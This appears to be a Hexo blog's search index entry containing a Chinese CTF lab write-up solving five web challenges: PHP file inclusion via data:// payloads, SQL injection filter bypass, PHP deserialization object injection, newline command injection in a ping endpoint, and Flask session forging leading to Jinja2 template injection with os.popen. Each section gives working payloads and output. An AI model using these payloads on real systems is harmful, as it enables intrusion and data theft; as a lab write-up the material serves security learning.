<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>网安实践4-WEB</title>
    <link href="/2024/06/13/ctf_wp/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B54-WEB/"/>
    <url>/2024/06/13/ctf_wp/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B54-WEB/</url>
    
    <content type="html"><![CDATA[<h2 id="T1-文件包含漏洞"><a href="#T1-文件包含漏洞" class="headerlink" title="T1.文件包含漏洞"></a>T1.文件包含漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// flag is in flag.php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造exp</p><p><code>GET ?file=data://text/plain;base64,</code></p><p><code>&lt;?php system(&quot;ls&quot;)?&gt;</code> <code>PD9waHAgc3lzdGVtKCJscyIpPz4%3D</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag.php index.php<br></code></pre></td></tr></table></figure><p><code>&lt;?php system(&quot;cat flag.php&quot;)?&gt;</code> <code>PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKT8%2B</code></p><p>发现cat不出来，估计cat被ban了 base64拿出来</p><p><code>&lt;?php system(&quot;base64 flag.php&quot;)?&gt;</code> <code>PD9waHAgc3lzdGVtKCJiYXNlNjQgZmxhZy5waHAiKT8%2BYA%3D%3D</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGZsYWc9InZtY3tRSUgxNmRYYzZVYkRSTGlQVnRZYmJ1dnE4SEZodHlOdH0iOwo=<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;vmc&#123;QIH16dXc6UbDRLiPVtYbbuvq8HFhtyNt&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="T2-SQL注入漏洞"><a href="#T2-SQL注入漏洞" class="headerlink" title="T2.SQL注入漏洞"></a>T2.SQL注入漏洞</h2><p>有过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;union&quot;</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;or&quot;</span>, <span class="hljs-string">&quot;ro&quot;</span>, <span class="hljs-string">&quot;where&quot;</span>);<br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$var</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只过滤一次，直接注<code>1&quot; ununionion selselectect 1,2,grrooup_concat(flflagag) frroom flflagag#</code></p><h2 id="T3-反序列化漏洞"><a href="#T3-反序列化漏洞" class="headerlink" title="T3.反序列化漏洞"></a>T3.反序列化漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getflag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file === <span class="hljs-string">&quot;flag.php&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tmp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$str1</span>, <span class="hljs-variable">$str2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str1 = <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;str2 = <span class="hljs-variable">$str2</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;easy&#x27;</span>];<br><span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ez&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">tmp</span>(<span class="hljs-variable">$str1</span>, <span class="hljs-variable">$str2</span>));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;easy&quot;</span>, <span class="hljs-string">&quot;ez&quot;</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>跑一下看看序列化后的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str1</span> = <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;<br><span class="hljs-variable">$str2</span> = <span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">tmp</span>(<span class="hljs-variable">$str1</span>, <span class="hljs-variable">$str2</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;easy&quot;</span>, <span class="hljs-string">&quot;ez&quot;</span>, <span class="hljs-variable">$data</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br><br><br><br><span class="hljs-comment"># O:3:&quot;tmp&quot;:2:&#123;s:4:&quot;str1&quot;;s:27:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:4:&quot;str2&quot;;s:24:&quot;bbbbbbbbbbbbbbbbbbbbbbbb&quot;;&#125;</span><br><span class="hljs-comment"># O:3:&quot;tmp&quot;:2:&#123;s:4:&quot;str1&quot;;s:27:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:4:&quot;str2&quot;;s:24:&quot;bbbbbbbbbbbbbbbbbbbbbbbb&quot;;&#125;</span><br><span class="hljs-comment"># object(tmp)#1 (2) &#123;</span><br><span class="hljs-comment">#   [&quot;str1&quot;]=&gt;</span><br><span class="hljs-comment">#   string(27) &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="hljs-comment">#   [&quot;str2&quot;]=&gt;</span><br><span class="hljs-comment">#  string(24) &quot;bbbbbbbbbbbbbbbbbbbbbbbb&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>序列化之后对象用字符串保存，字符串里记录了每个对象的类型，长度信息</p><p>给的字符串替换每次能吃掉str1两个字符，但是记录的str1长度不变，在反序列化时str1的长度就会包含后面的长度，使后面的类型出错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str1</span> = <span class="hljs-string">&#x27;easyeasyeasy&#x27;</span>;<br><span class="hljs-variable">$str2</span> = <span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span>;<br><br><br>O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;tmp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;str1&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;easyeasyeasy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;str2&quot;</span>;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;&#125;<br>O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;tmp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;str1&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;ezezez&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;str2&quot;</span>;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;&#125;<br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>可以看到str1的长度本来应该是12，替换之后反序列化时按12读str1的长度<code>ezezez&quot;;s:4:</code>，把后面的内容吞掉了，因此反序列化失败</p><p>因此可以利用字符串替换造成的长度改变吃掉一些控制字符，再在str2中构造对应的控制字符，就能手动构造反序列化后的对象</p><p>为了读flag，需要构造一个<code>catflag</code>对象，并且成员<code>file</code>需要为<code>flag.php</code>，尝试把str2构造成满足上面要求的对象:</p><p><code>s:4:&quot;str2&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>根据长度要求，得到str1和str2</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str1</span> = <span class="hljs-string">&#x27;easyeasyeasyeasyeasyeasyeasyeasyeasyeasye&#x27;</span>;<br><span class="hljs-variable">$str2</span> = <span class="hljs-string">&#x27;&quot;&quot;;s:4:&quot;str2&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>POST easy=easyeasyeasyeasyeasyeasyeasyeasyeasyeasye&amp; ez=%22%22%3Bs%3A4%3A%22str2%22%3BO%3A7%3A%22getflag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag%2Ephp%22%3B%7D%7D</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">$flag=&quot;vmc&#123;fJD1wTFH7GmJ7lJDopbSu9HjaJ765Ljk&#125;&quot;;</span><br></code></pre></td></tr></table></figure><h2 id="T4-远程命令执行漏洞"><a href="#T4-远程命令执行漏洞" class="headerlink" title="T4.远程命令执行漏洞"></a>T4.远程命令执行漏洞</h2><p>命令执行api<code>/ping.php</code></p><p>POST请求，发现对<code>;&amp;#</code>等字符有过滤，但是对换行符没有过滤，构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.1.1.1<br><span class="hljs-built_in">ls</span> &gt; tmp.txt<br></code></pre></td></tr></table></figure><p>url编码</p><p><code>POST ip=1%2E1%2E1%2E1%0Als%20%3E%20tmp%2Etxt</code></p><p>查看<code>/tmp.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">class.css<br>cloudF.jpg<br>cloudS.jpg<br>index.php<br>jquery.js<br>ping.php<br>tmp.txt<br></code></pre></td></tr></table></figure><p>没看到flag，再找找根目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.1.1.1<br><span class="hljs-built_in">ls</span> / &gt; tmp.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">bin<br>boot<br>dev<br>etc<br>flag<br>home<br>lib<br>lib32<br>lib64<br>libx32<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>srv<br>sys<br>tmp<br>usr<br>var<br></code></pre></td></tr></table></figure><p>看到flag了，直接cat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.1.1.1<br><span class="hljs-built_in">cat</span> /flag &gt; tmp.txt<br></code></pre></td></tr></table></figure><p><code>vmc&#123;W8MFa2vuozlsDTypNEe0l9XoiJxAZRDq&#125;</code></p><h2 id="T5-模板注入漏洞"><a href="#T5-模板注入漏洞" class="headerlink" title="T5.模板注入漏洞"></a>T5.模板注入漏洞</h2><p>响应标头有hint</p><p><code>Hint: tell you a secret: /nonono</code></p><p>访问<code>/nonono</code>拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">nonono<span class="hljs-string">&quot;</span><br><span class="hljs-string">        return rsp</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">@app.route(&#x27;/nonono&#x27;)</span><br><span class="hljs-string">def source():</span><br><span class="hljs-string">    f = open(__file__, &#x27;r&#x27;)</span><br><span class="hljs-string">    rsp = f.read()</span><br><span class="hljs-string">    f.close()</span><br><span class="hljs-string">    return rsp[rsp.index(&#x27;nonono&#x27;):]</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">@app.route(&#x27;/admin&#x27;)</span><br><span class="hljs-string">def admin_handler():</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        role = session.get(&#x27;role&#x27;)</span><br><span class="hljs-string">        if not isinstance(role, dict):</span><br><span class="hljs-string">            raise Exception</span><br><span class="hljs-string">    except Exception:</span><br><span class="hljs-string">        return &#x27;No, you are a hacker!&#x27;</span><br><span class="hljs-string">    if role.get(&#x27;is_admin&#x27;) == 1:</span><br><span class="hljs-string">        flag = role.get(&#x27;flag&#x27;) or &#x27;admin&#x27;</span><br><span class="hljs-string">        flag = filter(flag)</span><br><span class="hljs-string">        message = &quot;</span>%s, God bless you! The flag <span class="hljs-keyword">is</span> <span class="hljs-string">&quot; % flag</span><br><span class="hljs-string">        return render_template_string(message)</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        return &quot;</span>Error: Permission denied!<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-string">    app.run(&#x27;0.0.0.0&#x27;, port=80)</span><br></code></pre></td></tr></table></figure><p>需要让role里面的<code>is_admin</code>为1</p><p>role在session里面，flask的session存在cookie里面的</p><p><code>Cookie: session=eyJyb2xlIjp7ImlzX2FkbWluIjowLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.ZmqMcA.3ah8G2gg36p0dgQ4luF-yEUbKV0</code></p><p><a href="https://www.cnblogs.com/GTL-JU/p/16960460.html">对flask session伪造的学习 - GTL_JU - 博客园</a></p><p><a href="https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py">flask-session-cookie-manager&#x2F;flask_session_cookie_manager3.py at master · noraj&#x2F;flask-session-cookie-manager · GitHub</a></p><p>解码看看session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&#x27;eyJyb2xlIjp7ImlzX2FkbWluIjowLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.ZmqMcA.3ah8G2gg36p0dgQ4luF-yEUbKV0&#x27;</span><br><br>b<span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:0,&quot;name&quot;:&quot;test&quot;,&quot;secret_key&quot;:&quot;VGgxc0BvbmUhc2VDcmV0IQ==&quot;&#125;&#125;&#x27;</span><br><br>❯ <span class="hljs-built_in">echo</span> -n VGgxc0BvbmUhc2VDcmV0IQ== | <span class="hljs-built_in">base64</span> -d<br>Th1s@one!seCret!<br></code></pre></td></tr></table></figure><p>session的密钥也在上面<code>Th1s@one!seCret!</code></p><p>把<code>is_admin</code>修改成1，编码得到新的session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;secret_key&quot;:&quot;VGgxc0BvbmUhc2VDcmV0IQ==&quot;&#125;&#125;&#x27;</span><br>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.ZmqcBg.tcMeAN4LW-PuxKTmt1P9agbcggA<br></code></pre></td></tr></table></figure><p>成功pass掉<code>is_admin</code>的校验</p><p><code>admin, God bless you! The flag is</code></p><p>后面的模板<code>flag</code>也存在<code>role</code>字典里面，新增一项<code>&quot;flag&quot;:&quot;&#123;&#123;7*7&#125;&#125;&quot;&#125;&#125;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;secret_key&quot;:&quot;VGgxc0BvbmUhc2VDcmV0IQ==&quot;,&quot;flag&quot;:&quot;&#123;&#123;7*7&#125;&#125;&quot;&#125;&#125;&#x27;</span><br>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0iLCJmbGFnIjoie3s3Kjd9fSJ9fQ.ZmqcvA.UdtVkcQoCKqAn_YZHKQiTH4x9I0<br></code></pre></td></tr></table></figure><p><code>49, God bless you! The flag is</code></p><p>模板注入成功</p><p>先拿到<code>os</code></p><p><code>&#123;&#123;self.__init__.__globals__.__builtins__['__import__']('os')&#125;&#125;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;secret_key&quot;:&quot;VGgxc0BvbmUhc2VDcmV0IQ==&quot;,&quot;flag&quot;:&quot;&#123;&#123;self.__init__.__globals__.__builtins__.get(\&quot;__import__\&quot;)(\&quot;os\&quot;)&#125;&#125;&quot;&#125;&#125;&#x27;</span><br>.eJwdirsKAjEQRf9lKoVFVsuFbUQQSwu3WghJnI2DeUgyihLy745W99zDqZCTRxgqUFH6GijCsO0g6iASGAtDBwVtRlZ3_Iibju5t-_3LhMvN7qaDDVN_Oo-jdIvXTopaC_ploxRFYqUEnE9G-_Jn8yTPFH_HIa9mkC48UpZyhrX8VGRbg9a-QUw1jg.ZmqdQg.NayVVIECz3hw-ho1IgxtoQdhMcQ<br></code></pre></td></tr></table></figure><p><code>&lt;module &#39;os&#39; from &#39;/usr/lib/python3.8/os.py&#39;&gt;, God bless you! The flag is</code></p><p>利用<code>os.popen().read()</code>执行命令并返回结果</p><p>先<code>ls</code>一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;secret_key&quot;:&quot;VGgxc0BvbmUhc2VDcmV0IQ==&quot;,&quot;flag&quot;:&quot;&#123;&#123;self.__init__.__globals__.__builtins__.get(\&quot;__import__\&quot;)(\&quot;os\&quot;).popen(\&quot;ls\&quot;).read()&#125;&#125;&quot;&#125;&#125;&#x27;</span><br>.eJwdisEKwjAQBf9lTy2UUj0WehFBPHqwp0JI020MbpKSRFFC_t21p_dmmAzBE0KfwUQhF2sc9IcGnLQsIWFM0EBEFTCJJ37ZjRf9Ud3pPdv7Qx3Hs7Jjd70NA3crSc1FzhFpbYUwziQh-Gjys6S4__llKBn3B42pmoA7u_nA5QQ1s4-87eY3dEy0U0C5VHUpUMoP58g8JQ.ZmqdqA.A1G80iMgEsbG_mk6TzcBvHfSWuM<br></code></pre></td></tr></table></figure><p><code>__pycache__ app.py secret.py , God bless you! The flag is</code></p><p>flag应该在根目录下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;secret_key&quot;:&quot;VGgxc0BvbmUhc2VDcmV0IQ==&quot;,&quot;flag&quot;:&quot;&#123;&#123;self.__init__.__globals__.__builtins__.get(\&quot;__import__\&quot;)(\&quot;os\&quot;).popen(\&quot;ls /\&quot;).read()&#125;&#125;&quot;&#125;&#125;&#x27;</span><br>.eJwdir0KwjAURl9F7tRCqdWx0EUEcXSwUyGk6W0M5o8kihLy7t46fd85nAzBaYQ-g4qML0ZZ6A8NWG5IQsKYoIGIImBiT_ySGy_yI7rTezb3hziOZ2HG7nobBupWzSUVOUfUa8uYsioxRkdqN3Md_39-KZ2U3UBiqiagzngXqJygJnaRtvXOoyXScbffOCBfqroUKOUHW4E8dA.Zmqd2A.pNJ0HSDvBVygZ7mh-YKt0sSePWc<br></code></pre></td></tr></table></figure><p><code>app bin boot dev etc flag home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var , God bless you! The flag is</code></p><p>读flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;secret_key&quot;:&quot;VGgxc0BvbmUhc2VDcmV0IQ==&quot;,&quot;flag&quot;:&quot;&#123;&#123;self.__init__.__globals__.__builtins__.get(\&quot;__import__\&quot;)(\&quot;os\&quot;).popen(\&quot;cat /flag\&quot;).read()&#125;&#125;&quot;&#125;&#125;&#x27;</span><br>.eJwdjM0KwjAQBl9F9tRCqdVjoRcRxKMHeyqENN3GYP5Ioigh7-7W034zDJshOI3QZ1CR8cUoC_2hAcsNSUgYEzQQUQRM7IlfcuNFfkR3es_m_hDH8SzM2F1vw0DdqrmkIueIem0ZU1YlxmhI7Wau43_PL6WTshtITNUE1BnvApUT1MQu0m2982iJBE-7_fZ4kwH5UtWlQCk_lNo-Zw.Zmqd_g.uo8etPTlzPXNUQ8gMg2Bos7Scq4<br></code></pre></td></tr></table></figure><p><code>vmc&#123;5usT3k9aad5wcaFRs3TYNTrLYWL4d1r0&#125; , God bless you! The flag is</code></p><p>成功拿到flag</p><p>顺便看看源码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 